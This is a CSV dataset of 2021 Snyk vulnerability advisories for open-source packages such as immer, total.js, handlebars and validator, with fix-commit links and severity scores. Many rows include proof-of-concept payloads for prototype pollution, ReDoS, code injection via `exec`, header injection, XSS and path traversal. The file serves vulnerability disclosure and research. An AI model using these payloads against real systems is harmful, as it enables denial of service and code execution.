CVE-2021-23437,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-1319443,03/09/2021,15/07/2021,https://github.com/python-pillow/Pillow/commit/9e08eb8f78fdfd2f476e1b20b7cf38683754866b,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/python-pillow/Pillow/commits/9e08eb8f78fdfd2f476e1b20b7cf38683754866b,Hugo van Kemenade,hugovk@users.noreply.github.com,Pillow,9e08eb8f78fdfd2f476e1b20b7cf38683754866b,Raise ValueError if color specifier is too long,Python,7.5,high,"Pillow is a PIL (Python Imaging Library) fork.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the getrgb function.",2021
CVE-2021-23436,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-IMMER-1540542,01/09/2021,12/08/2021,https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237,Prototype Pollution,https://api.github.com/repos/immerjs/immer/commits/fa671e55ee9bd42ae08cc239102b665a23958237,Michel Weststrate,mweststrate@gmail.com,immer,fa671e55ee9bd42ae08cc239102b665a23958237,"fix(security): Follow up on CVE-2020-28477 where `path: [[""__proto__""], ""x""]` could still pollute the prototype",JavaScript,5.6,medium,"immer is a package that allows you to create your next immutable state by mutating the current one.
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2020-28477 when the user-provided keys used in the path parameter are arrays. In particular, this bypass is possible because the condition (p === ""__proto__"" || p === ""constructor"") in applyPatches_ returns false if p is ['__proto__'] (or ['constructor']). The === operator (strict equality operator) returns false if the operands have different type.
PoC
const {applyPatches, enablePatches} = require(""immer"");
enablePatches();

// applyPatches({}, [ { op: 'add', path: [ ""proto"", ""polluted"" ], value: ""yes"" } ]);
// applyPatches({}, [ { op: 'replace', path: [ ""proto"", ""polluted"" ], value: ""yes"" } ]);
// console.log(polluted); // Error: [Immer] Patching reserved attributes like proto, prototype and constructor is not allowed
applyPatches({}, [ { op: 'add', path: [['proto'], 'polluted'], value: 'yes' } ]);
// applyPatches({}, [ { op: 'replace', path: [['proto'], 'polluted'], value: 'yes' } ]);
console.log(polluted);",2021
CVE-2021-23425,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-TRIMOFFNEWLINES-1296850,18/08/2021,26/05/2021,https://github.com/stevemao/trim-off-newlines/commit/6226c958cbbac284a840010eb1f6617fb99a5645,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/stevemao/trim-off-newlines/commits/6226c958cbbac284a840010eb1f6617fb99a5645,Steve Mao,maochenyan@gmail.com,trim-off-newlines,6226c958cbbac284a840010eb1f6617fb99a5645,"Merge pull request #4 from Trott/fix-it-again

fix: remediate ReDOS further",JavaScript,5.3,medium,"trim-off-newlines is a Similar to String#trim() but removes only newlines
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via string processing.
PoC
const trim = require('trim-off-newlines');

for (let i=10; i < 25; i += 1)
{
const s = 'a' + (""rn"").repeat(i) + 'a';
const start = +new Date();
trim(s);
const end = +new Date();
console.log(s.length + 't' + (end - start));
}",2021
CVE-2021-23423,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-BIKESHED-1537647,15/08/2021,08/08/2021,https://github.com/tabatkins/bikeshed/commit/b2f668fca204260b1cad28d5078e93471cb6b2dd,Directory Traversal,https://api.github.com/repos/tabatkins/bikeshed/commits/b2f668fca204260b1cad28d5078e93471cb6b2dd,Tab Atkins-Bittner,jackalmage@gmail.com,bikeshed,b2f668fca204260b1cad28d5078e93471cb6b2dd,"Prevent escaping the source doc's folder, or running arbitrary code, without explicit opt-in at the command-line.",Python,5.5,medium,"bikeshed is a pre-processor for spec documents.
Affected versions of this package are vulnerable to Directory Traversal. This can occur when an untrusted source file containing include, include-code or include-raw block is processed. The contents of arbitrary files could be disclosed in the HTML output.",2021
CVE-2021-23419,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-OPENGRAPH-1536747,05/08/2021,05/08/2021,https://github.com/samholmes/node-open-graph/commit/a0cef507a90adaac7dbbe9c404f09a50bdefb348,Prototype Pollution,https://api.github.com/repos/samholmes/node-open-graph/commits/a0cef507a90adaac7dbbe9c404f09a50bdefb348,Samuel Holmes,sam@edge.app,node-open-graph,a0cef507a90adaac7dbbe9c404f09a50bdefb348,Patch: Filter out blacklisted keys in og property name,JavaScript,7.3,high,"open-graph is an Open Graph implementation for Node.js.
Affected versions of this package are vulnerable to Prototype Pollution. The function parse could be tricked into adding or modifying properties of Object.prototype using a __proto__ or constructor payload.",2021
CVE-2021-23422,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-BIKESHED-1537646,15/08/2021,15/08/2021,https://github.com/tabatkins/bikeshed/commit/b2f668fca204260b1cad28d5078e93471cb6b2dd,Arbitrary Code Injection,https://api.github.com/repos/tabatkins/bikeshed/commits/b2f668fca204260b1cad28d5078e93471cb6b2dd,Tab Atkins-Bittner,jackalmage@gmail.com,bikeshed,b2f668fca204260b1cad28d5078e93471cb6b2dd,"Prevent escaping the source doc's folder, or running arbitrary code, without explicit opt-in at the command-line.",Python,7.8,high,"bikeshed is a pre-processor for spec documents.
Affected versions of this package are vulnerable to Arbitrary Code Injection. This can occur when an untrusted source file containing Inline Tag Command metadata is processed. When an arbitrary OS command is executed, the command output would be included in the HTML output.",2021
CVE-2021-23418,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-GLANCES-1311807,29/07/2021,18/06/2021,https://github.com/nicolargo/glances/commit/9d6051be4a42f692392049fdbfc85d5dfa458b32,XML External Entity (XXE) Injection,https://api.github.com/repos/nicolargo/glances/commits/9d6051be4a42f692392049fdbfc85d5dfa458b32,nicolargo,nicolas@nicolargo.com,glances,9d6051be4a42f692392049fdbfc85d5dfa458b32,Security audit - B411 #1025,Unknown,6.3,medium,"Glances is an A cross-platform curses-based monitoring tool
Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via the use of Fault to parse untrusted XML data, which is known to be vulnerable to XML attacks.",2021
CVE-2021-23415,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-ELFINDERASPNET-1315153,28/07/2021,30/06/2021,https://github.com/mguinness/elFinder.AspNet/commit/675049b39284a9e84f0915c71d688da8ebc7d720,Directory Traversal,https://api.github.com/repos/mguinness/elFinder.AspNet/commits/675049b39284a9e84f0915c71d688da8ebc7d720,mguinness,sufc@netzero.net,elFinder.AspNet,675049b39284a9e84f0915c71d688da8ebc7d720,Directory traversal fixes,C#,7.5,high,"elFinder.AspNet is an elFinder ASP.NET backend
Affected versions of this package are vulnerable to Directory Traversal. The user-controlled file name is not properly sanitized before it is used to create a file system path.
PoC
# A test environment is within the GitHub repository and can be set up as following:

git clone https://github.com/mguinness/elFinder.AspNet.git
cd elFinder.AspNet/elFinder.AspNet.Web/
libman restore
dotnet run
Browse to http://localhost:5000/
The vulnerability can be verified as following:

Right-click on one of the existing files and choose rename
Rename the file to ../attacker.txt
An error message by the server appears
The file should now be written into the wwwroot ls wwwroot, instead of the expected volume folder",2021
CVE-2021-23414,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-VIDEOJS-1533429,26/07/2021,26/07/2021,https://github.com/videojs/video.js/commit/b3acf663641fca0f7a966525a72845af7ec5fab2,Cross-site Scripting (XSS),https://api.github.com/repos/videojs/video.js/commits/b3acf663641fca0f7a966525a72845af7ec5fab2,Gary Katsevman,gary.katsevman@gmail.com,video.js,b3acf663641fca0f7a966525a72845af7ec5fab2,fix: remove IE8 url parsing workaround (#7334),JavaScript,6.5,medium,"video.js is a web video player built from the ground up for an HTML5 world.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The src attribute of track tag allows to bypass HTML escaping and execute arbitrary code.",2021
CVE-2021-23413,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSZIP-1251497,25/07/2021,18/04/2021,https://github.com/Stuk/jszip/commit/22357494f424178cb416cdb7d93b26dd4f824b36,Denial of Service (DoS),https://api.github.com/repos/Stuk/jszip/commits/22357494f424178cb416cdb7d93b26dd4f824b36,Michael Aquilina,michaelaquilina@gmail.com,jszip,22357494f424178cb416cdb7d93b26dd4f824b36,"fix: Use a null prototype object for this.files

This approach is taken to prevent overriding object methods that would
exist on a normal object Object.create({})",JavaScript,5.3,medium,"jszip is a Create, read and edit .zip files with JavaScript http://stuartk.com/jszip
Affected versions of this package are vulnerable to Denial of Service (DoS). Crafting a new zip file with filenames set to Object prototype values (e.g __proto__, toString, etc) results in a returned object with a modified prototype instance.
PoC
const jszip = require('jszip');

async function loadZip() {
// this is a raw buffer of demo.zip containing 2 empty files:
// - ""file.txt""
// - ""toString""
const demoZip = Buffer.from('UEsDBBQACAAIANS8kVIAAAAAAAAAAAAAAAAIACAAdG9TdHJpbmdVVA0AB3Bje2BmY3tgcGN7YHV4CwABBPUBAAAEFAAAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgACADDvJFSAAAAAAAAAAAAAAAACAAgAGZpbGUudHh0VVQNAAdPY3tg4FJ7YE9je2B1eAsAAQT1AQAABBQAAAADAFBLBwgAAAAAAgAAAAAAAABQSwECFAMUAAgACADUvJFSAAAAAAIAAAAAAAAACAAgAAAAAAAAAAAApIEAAAAAdG9TdHJpbmdVVA0AB3Bje2BmY3tgcGN7YHV4CwABBPUBAAAEFAAAAFBLAQIUAxQACAAIAMO8kVIAAAAAAgAAAAAAAAAIACAAAAAAAAAAAACkgVgAAABmaWxlLnR4dFVUDQAHT2N7YOBSe2BPY3tgdXgLAAEE9QEAAAQUAAAAUEsFBgAAAAACAAIArAAAALAAAAAAAA==', 'base64');
const zip = await jszip.loadAsync(demoZip);
zip.files.toString(); // this will throw
return zip;
}
loadZip();",2021
CVE-2021-23407,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-ELFINDERNETCORE-1315152,14/07/2021,30/06/2021,https://github.com/trannamtrung1st/elFinder.Net.Core/commit/5498c8a86b76ef089cfbd7ef8be014b61fa11c73,Directory Traversal,https://api.github.com/repos/trannamtrung1st/elFinder.Net.Core/commits/5498c8a86b76ef089cfbd7ef8be014b61fa11c73,trung-tran-sts,trung.tran@saigontechnology.com,elFinder.Net.Core,5498c8a86b76ef089cfbd7ef8be014b61fa11c73,Finish security patch 1.2.4,C#,7.5,high,"elFinder.Net.Core is an An elFinder backend connector with less magic code and more compatibility. This enables .NET Standard 2.0 projects to easily integrate elFinder functionalities.
Affected versions of this package are vulnerable to Directory Traversal. The user-controlled file name is not properly sanitized before it is used to create a file system path.
PoC
# A test environment is within the GitHub repository and can be set up as following:

git clone https://github.com/trannamtrung1st/elFinder.Net.Core.git
cd elFinder.Net.Core/elFinder.Net.Core/Demos/elFinder.Net.Demo31
libman restore
dotnet run
Browse to http://localhost:5000/
The vulnerability can be verified as following:
1. Upload any file to the server
2. Right-click the file and choose rename
3. Rename the file to ../attacker.txt
4. An error message by the server appears
5. The file should now be written into the wwwroot ls wwwroot, instead of the expected volume folder",2021
CVE-2021-23390,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-TOTAL4-1130527,07/07/2021,24/03/2021,https://github.com/totaljs/framework4/commit/8a72d8c20f38bbcac031a76a51238aa528f68821,Arbitrary Code Execution,https://api.github.com/repos/totaljs/framework4/commits/8a72d8c20f38bbcac031a76a51238aa528f68821,Peter Širka,petersirka@gmail.com,framework4,8a72d8c20f38bbcac031a76a51238aa528f68821,Removed useless methods.,Unknown,9.8,critical,"total4 is a framework for Node.js platform written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as a web, desktop, service, or IoT application.
Affected versions of this package are vulnerable to Arbitrary Code Execution via the U.set() and U.get() functions.
PoC by Alessio Della Libera
const total = require('total4');
U.set({}, 'a;let {mainModule}=process; let {require}=mainModule; let {exec}=require(""child_process""); exec(""touch HACKED"")//');",2021
CVE-2021-23389,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1088607,07/07/2021,24/03/2021,https://github.com/totaljs/framework/commit/887b0fa9e162ef7a2dd9cec20a5ca122726373b3,Arbitrary Code Execution,https://api.github.com/repos/totaljs/framework/commits/887b0fa9e162ef7a2dd9cec20a5ca122726373b3,Peter Širka,petersirka@gmail.com,framework,887b0fa9e162ef7a2dd9cec20a5ca122726373b3,Fixed security issue in `U.set()` and `U.get()`.,Unknown,9.8,critical,"total.js is a framework for Node.js platfrom written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.
Affected versions of this package are vulnerable to Arbitrary Code Execution via the U.set() and U.get() functions.
PoC by Alessio Della Libera
const total = require('total.js');
U.set({}, 'a;let {mainModule}=process; let {require}=mainModule; let {exec}=require(""child_process""); exec(""touch HACKED"")//');",2021
CVE-2021-23400,CWE-644,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODEMAILER-1296415,28/06/2021,24/05/2021,https://github.com/nodemailer/nodemailer/commit/7e02648cc8cd863f5085bad3cd09087bccf84b9f,HTTP Header Injection,https://api.github.com/repos/nodemailer/nodemailer/commits/7e02648cc8cd863f5085bad3cd09087bccf84b9f,Andris Reinman,andris@kreata.ee,nodemailer,7e02648cc8cd863f5085bad3cd09087bccf84b9f,v6.6.1,Config files,6.3,medium,"nodemailer is an Easy as cake e-mail sending from your Node.js applications
Affected versions of this package are vulnerable to HTTP Header Injection if unsanitized user input that may contain newlines and carriage returns is passed into an address object.
PoC:
const userEmail = 'foo@bar.comrnSubject: foobar'; // imagine this comes from e.g. HTTP request params or is otherwise user-controllable
await transporter.sendMail({
from: '...',
to: '...',
replyTo: {
name: 'Customer',
address: userEmail,
},
subject: 'My Subject',
text: message,
});",2021
CVE-2021-23403,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-TSNODASH-1311009,02/07/2021,17/06/2021,https://github.com/BadOPCode/NoDash/commit/b9cc2b3b49f6cd5228e406bc57e17a28b998fea5,Prototype Pollution,https://api.github.com/repos/BadOPCode/NoDash/commits/b9cc2b3b49f6cd5228e406bc57e17a28b998fea5,huntr.dev | the place to protect open source,security@huntr.dev,NoDash,b9cc2b3b49f6cd5228e406bc57e17a28b998fea5,"Security fix for Prototype Pollution (#20)

Co-authored-by: Arjun Shibu <arjunshibu1999@gmail.com>
Co-authored-by: Jamie Slome <jamie@418sec.com>
Co-authored-by: Shawn <BadOPCode@users.noreply.github.com>",TypeScript,7.3,high,"ts-nodash is a Provides object manipulation tools.
Affected versions of this package are vulnerable to Prototype Pollution via the Merge() function due to lack of validation input.
PoC
const nodash = require(""ts-nodash"");
let obj = {};
console.log(""Before being polluted: "" + obj.polluted);
var EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":true}}');
nodash.Merge({}, EVIL_JSON);
console.log(""After being polluted: "" + obj.polluted);",2021
CVE-2021-36716,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-ISEMAIL-1279002,27/06/2021,03/05/2021,https://github.com/segmentio/is-email/commit/060ecedf345729f11ad857ccaf7a915ff6797739,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/segmentio/is-email/commits/060ecedf345729f11ad857ccaf7a915ff6797739,Julio Farah,julio.farah@segment.com,is-email,060ecedf345729f11ad857ccaf7a915ff6797739,"Use a more strict regex to prevent ReDoS (#7)

* Use strict regexp to prevent ReDoS

* Update .github/workflows/node-js.yml

* Update lib/index.js

* build with yarn",Config files,5.3,medium,"is-email is a Loosely validate an email address.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the isEmail() function.
PoC:
var isEmail = require(""is-email"")
function build_blank(n) {
 var ret = """"
 for (var i = 0; i < n; i++) {
  ret += ""@""
 }
 return ret + ""!"";
}

for(var i = 1; i <= 5000000; i++) {
    if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_blank(i)
        isEmail(attack_str)
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"")
 }
}",2021
CVE-2021-32012,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-XLSX-1311141,17/06/2021,17/06/2021,https://github.com/SheetJS/sheetjs/commit/3542d62fffc155dd505a23230ba182c4402a0e2c,Denial of Service (DoS),https://api.github.com/repos/SheetJS/sheetjs/commits/3542d62fffc155dd505a23230ba182c4402a0e2c,Jeremy Mill,jeremymill@gmail.com,sheetjs,3542d62fffc155dd505a23230ba182c4402a0e2c,"version bump 0.17.0

- Explicit errors on inconsistent XLS records
- DBF cap worksheet to 1<<20 rows",Unknown,7.5,high,"xlsx is a Parser and writer for various spreadsheet formats.
Affected versions of this package are vulnerable to Denial of Service (DoS). An attacker who can send a malicious excel file parsed by this library can crash the Node.JS process.",2021
CVE-2021-23393,CWE-601,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-FLASKUNCHAINED-1293189,10/06/2021,16/05/2021,https://github.com/briancappello/flask-unchained/commit/71e36b28166f9ffbe0a991f51127f0984f7e6a40,Open Redirect,https://api.github.com/repos/briancappello/flask-unchained/commits/71e36b28166f9ffbe0a991f51127f0984f7e6a40,Brian Cappello,briancappello@gmail.com,flask-unchained,71e36b28166f9ffbe0a991f51127f0984f7e6a40,add tests for validate_redirect_url,Python,5.4,medium,"Flask-Unchained is a The quickest and easiest way to build large web apps and APIs with Flask and SQLAlchemy
Affected versions of this package are vulnerable to Open Redirect. When using the the _validate_redirect_url function, it is possible to bypass URL validation and redirect a user to an arbitrary URL by providing multiple back slashes such as \\\evil.com/path.
This vulnerability is only exploitable if an alternative WSGI server other than Werkzeug is used, or the default behaviour of Werkzeug is modified using  'autocorrect_location_header=False`.",2021
CVE-2021-23394,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PHP-STUDIO42ELFINDER-1290554,13/06/2021,09/05/2021,https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1,Remote Code Execution (RCE),https://api.github.com/repos/Studio-42/elFinder/commits/75ea92decc16a5daf7f618f85dc621d1b534b5e1,nao-pon,hypweb@gmail.com,elFinder,75ea92decc16a5daf7f618f85dc621d1b534b5e1,"[VD:abstract] add `'phar:*' => 'text/x-php'` into 'staticMineMap'

rel. #3295",PHP,8.1,high,"studio-42/elfinder is an open-source file manager for web, written in JavaScript using jQuery UI.
Affected versions of this package are vulnerable to Remote Code Execution (RCE) via execution of PHP code in a .phar file.
NOTE: This only applies if the server is configured to parse .phar files as PHP.",2021
CVE-2021-32013,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-XLSX-1311137,17/06/2021,17/06/2021,https://github.com/SheetJS/sheetjs/commit/3542d62fffc155dd505a23230ba182c4402a0e2c,Denial of Service (DoS),https://api.github.com/repos/SheetJS/sheetjs/commits/3542d62fffc155dd505a23230ba182c4402a0e2c,Jeremy Mill,jeremymill@gmail.com,sheetjs,3542d62fffc155dd505a23230ba182c4402a0e2c,"version bump 0.17.0

- Explicit errors on inconsistent XLS records
- DBF cap worksheet to 1<<20 rows",Unknown,7.5,high,"xlsx is a Parser and writer for various spreadsheet formats.
Affected versions of this package are vulnerable to Denial of Service (DoS). An attacker who can send a malicious excel file parsed by this library can crash the Node.JS process.",2021
CVE-2021-32014,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-XLSX-1311139,17/06/2021,17/06/2021,https://github.com/SheetJS/sheetjs/commit/3542d62fffc155dd505a23230ba182c4402a0e2c,Denial of Service (DoS),https://api.github.com/repos/SheetJS/sheetjs/commits/3542d62fffc155dd505a23230ba182c4402a0e2c,Jeremy Mill,jeremymill@gmail.com,sheetjs,3542d62fffc155dd505a23230ba182c4402a0e2c,"version bump 0.17.0

- Explicit errors on inconsistent XLS records
- DBF cap worksheet to 1<<20 rows",Unknown,7.5,high,"xlsx is a Parser and writer for various spreadsheet formats.
Affected versions of this package are vulnerable to Denial of Service (DoS). An attacker who can send a malicious excel file parsed by this library can cause maximum CPU usage.",2021
CVE-2021-29059,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-ISSVG-1243891,05/05/2021,17/03/2021,https://github.com/sindresorhus/is-svg/commit/732fc72779840c45a30817d3fe28e12058592b02,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/sindresorhus/is-svg/commits/732fc72779840c45a30817d3fe28e12058592b02,Sindre Sorhus,sindresorhus@gmail.com,is-svg,732fc72779840c45a30817d3fe28e12058592b02,Improve performance and accuracy,JavaScript,5.3,medium,"is-svg is a Check if a string or buffer is SVG
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the removeDtdMarkupDeclarations and entityRegex regular expressions, bypassing the fix for CVE-2021-28092.
PoC by Yeting Li
//1) 1st ReDoS caused by the two sub-regexes [A-Z]+ and [^>]* in `removeDtdMarkupDeclarations`.
const isSvg = require('is-svg');
function build_attack1(n) {
var ret = '<!'
for (var i = 0; i < n; i++) {
ret += 'DOCTYPE'
}

return ret+"""";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack1(i);
       isSvg(attack_str);
   var time_cost = Date.now() - time;
   console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)

 }
}
//2) 2nd ReDoS caused by ? the first sub-regex  \s*  in entityRegex.
function build_attack2(n) {
var ret = ''
for (var i = 0; i < n; i++) {
ret += ' '
}
return ret+"""";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack2(i);
       isSvg(attack_str);
   var time_cost = Date.now() - time;
   console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)

 }
}
//3rd ReDoS caused by the sub-regex \s+\S\s  in entityRegex.
function build_attack3(n) {
var ret = '<!Entity'
for (var i = 0; i < n; i++) {
ret += ' '
}
return ret+"""";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack3(i);
       isSvg(attack_str);
   var time_cost = Date.now() - time;
   console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)

 }
}
//4th ReDoS caused by the sub-regex \S\s(?:""|')[^""]+  in entityRegex.
function build_attack4(n) {
var ret = '<!Entity '
for (var i = 0; i < n; i++) {
ret += '&#39;'
}
return ret+"""";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack4(i);
       isSvg(attack_str);
   var time_cost = Date.now() - time;
   console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)

 }
}",2021
CVE-2021-23383,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029,04/05/2021,08/01/2021,https://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427,Prototype Pollution,https://api.github.com/repos/handlebars-lang/handlebars.js/commits/f0589701698268578199be25285b2ebea1c1e427,Nils Knappmeier,npm@knappi.org,handlebars.js,f0589701698268578199be25285b2ebea1c1e427,fix: escape property names in compat mode (#1736),JavaScript,5.6,medium,"handlebars is an extension to the Mustache templating language.
Affected versions of this package are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.
POC
<script src=""https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js""></script> 
<script> 
// compile the template 

var s2 = {{&#39;a/.&quot;) || alert(&quot;Vulnerable Handlebars JS when compiling in compat mode&#39;}}; 
var template = Handlebars.compile(s2, { 
compat: true 
}); 
// execute the compiled template and print the output to the console console.log(template({})); 
</script>",2021
CVE-2021-23364,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-BROWSERSLIST-1090194,28/04/2021,01/04/2021,https://github.com/browserslist/browserslist/commit/c091916910dfe0b5fd61caad96083c6709b02d98,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/browserslist/browserslist/commits/c091916910dfe0b5fd61caad96083c6709b02d98,Andrey Sitnik,andrey@sitnik.ru,browserslist,c091916910dfe0b5fd61caad96083c6709b02d98,Fix unsafe regexp,JavaScript,5.3,medium,"browserslist is a Share target browsers between different front-end tools, like Autoprefixer, Stylelint and babel-env-preset
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) during parsing of queries.
PoC by Yeting Li
var browserslist = require(""browserslist"")
function build_attack(n) {
    var ret = ""> ""
    for (var i = 0; i < n; i++) {
        ret += ""1""
    }
    return ret + ""!"";
}

// browserslist('> 1%')
//browserslist(build_attack(500000))
for(var i = 1; i <= 500000; i++) {
    if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
        try{
            browserslist(attack_str);
            var time_cost = Date.now() - time;
            console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"");
            }
        catch(e){
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"");
        }
    }
}",2021
,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-PHP-JAKUBPASSUITECRM-1277522,29/04/2021,28/04/2021,https://github.com/salesagility/SuiteCRM/commit/9cb957e4f41562eb44f6ce8c982e2a3c169fc951,Deserialization of Untrusted Data,https://api.github.com/repos/salesagility/SuiteCRM/commits/9cb957e4f41562eb44f6ce8c982e2a3c169fc951,Dillon-Brown,dillon.brown@salesagility.com,SuiteCRM,9cb957e4f41562eb44f6ce8c982e2a3c169fc951,7.11.19,Markdown,6.7,medium,"jakubpas/suitecrm is a composer fork of SuiteCRM - the open source alternative to SalesForce, Microsoft Dynamics and SugarCRM Professiona
Affected versions of this package are vulnerable to Deserialization of Untrusted Data. Phar Deserialization is possible due to insufficient checks within the admin area.
Note: jakubpas/suitecrm is an out of date fork of SuiteCRM and successful exploitation of the vulnerability through chaining differs from the out of date fork.",2021
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-NGXMARKDOWNEDITOR-1245072,03/05/2021,13/04/2021,https://github.com/lon-yang/ngx-markdown-editor/commit/5b6bc97b41116bb65899b5bd20b5aa3032793999,Cross-site Scripting (XSS),https://api.github.com/repos/lon-yang/ngx-markdown-editor/commits/5b6bc97b41116bb65899b5bd20b5aa3032793999,Yang-LY,dove2580@live.com,ngx-markdown-editor,5b6bc97b41116bb65899b5bd20b5aa3032793999,fix #93,Config files,5.4,medium,"ngx-markdown-editor is an Angular markdown editor based on ace editor.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The vulnerability can be exploited when previewing the Markdown content.",2021
CVE-2021-23327,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-APEXCHARTS-1300579,08/06/2021,07/06/2021,https://github.com/apexcharts/apexcharts.js/commit/67be39cf878198b6c2f4056a3285aaf686102019,Cross-site Scripting (XSS),https://api.github.com/repos/apexcharts/apexcharts.js/commits/67be39cf878198b6c2f4056a3285aaf686102019,junedchhipa,juned.chhipa@gmail.com,apexcharts.js,67be39cf878198b6c2f4056a3285aaf686102019,sanitize input to prevent cross site scripting,JavaScript,6.3,medium,"apexcharts is a modern JavaScript charting library to build interactive charts and visualizations with simple API.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). This is the same vulnerability as CVE-2021-23327, which was reintroduced as a regression in v3.26.0.",2021
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-VALIDATOR-1090599,26/04/2021,05/04/2021,https://github.com/tux-tn/validator.js/commit/b21879cf45c05ee11b2d79e612b651bf7b2d93b7#diff-f41087599986e29c3c0dc15b62f1bf96d8aba16fe41f3730e315c84c2c4cb311,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/tux-tn/validator.js/commits/b21879cf45c05ee11b2d79e612b651bf7b2d93b7#diff-f41087599986e29c3c0dc15b62f1bf96d8aba16fe41f3730e315c84c2c4cb311,Sarhan,sarhanaissi@gmail.com,validator.js,b21879cf45c05ee11b2d79e612b651bf7b2d93b7,fix(rtrim): remove regex to prevent ReDOS attack,JavaScript,5.3,medium,"validator is a library of string validators and sanitizers.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the isSlug function
PoC
var validator = require(""validator"")
function build_attack(n) {
    var ret = ""111""
    for (var i = 0; i < n; i++) {
        ret += ""a""
    }

return ret+&quot;_&quot;;

}
for(var i = 1; i <= 50000; i++) {
    if (i % 10000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
       validator.isSlug(attack_str)
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"")
   }
}",2021
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-NESTIE-1300518,07/06/2021,06/06/2021,https://github.com/lukeed/nestie/commit/c571c77928ecd7f256a935c7c3860f33dac4653f,Prototype Pollution,https://api.github.com/repos/lukeed/nestie/commits/c571c77928ecd7f256a935c7c3860f33dac4653f,Luke Edwards,luke.edwards05@gmail.com,nestie,c571c77928ecd7f256a935c7c3860f33dac4653f,"fix: break on ""constructor|prototype"" keys too;

- more prototype pollution protection --.--",JavaScript,5.6,medium,"nestie is an A tiny (224B) and fast utility to expand a flattened object
Affected versions of this package are vulnerable to Prototype Pollution. A bypass of CVE-2021-25947 is possible which could lead to pollution of the object prototype.
PoC
var { nestie } = require(""nestie"")
console.log(""Before : "" + {}.polluted);
nestie({""constructor.prototype.polluted"": ""Yes! Its Polluted""})
 console.log(""After : "" + {}.polluted);",2021
